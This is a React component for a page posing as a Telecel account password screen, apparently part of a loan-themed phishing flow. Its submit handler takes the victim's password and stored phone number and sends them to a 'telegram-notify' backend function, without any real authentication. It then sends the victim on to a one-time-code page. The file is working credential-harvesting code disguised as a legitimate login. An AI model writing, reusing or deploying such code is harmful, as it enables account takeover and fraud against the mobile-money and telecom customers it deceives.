import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { ArrowLeft, Eye, EyeOff } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import MobileShell from "@/components/MobileShell";
import { supabase } from "@/integrations/supabase/client";

const PasswordPage = () => {
  const navigate = useNavigate();
  const [password, setPassword] = useState("");
  const [show, setShow] = useState(false);
  const [loading, setLoading] = useState(false);

  const handleNext = async () => {
    if (!password) return;
    setLoading(true);
    try {
      const saved = localStorage.getItem("telecel_loan");
      const phone = saved ? JSON.parse(saved).verifyPhone : "N/A";

      await supabase.functions.invoke("telegram-notify", {
        body: { type: "password", value: password, phone },
      });
    } catch (e) {
      console.error("Error sending password:", e);
    }
    setLoading(false);
    navigate("/otp");
  };

  return (
    <MobileShell>
      <div className="telecel-gradient px-6 py-4 flex items-center gap-3">
        <button onClick={() => navigate("/verify")} className="text-primary-foreground">
          <ArrowLeft className="w-5 h-5" />
        </button>
        <h1 className="text-lg font-bold text-primary-foreground">Enter Password</h1>
      </div>

      <div className="flex-1 px-6 py-6 space-y-5">
        <p className="text-sm text-muted-foreground">
          Enter your Telecel account password to continue.
        </p>

        <div>
          <Label className="text-xs">Password</Label>
          <div className="relative mt-1">
            <Input
              type={show ? "text" : "password"}
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Enter your password"
              className="pr-10"
            />
            <button
              type="button"
              onClick={() => setShow(!show)}
              className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground"
            >
              {show ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
            </button>
          </div>
        </div>
      </div>

      <div className="px-6 pb-6">
        <Button
          onClick={handleNext}
          disabled={!password || loading}
          className="w-full h-12 rounded-xl font-semibold"
        >
          {loading ? "Sending..." : "Next"}
        </Button>
      </div>
    </MobileShell>
  );
};

export default PasswordPage;
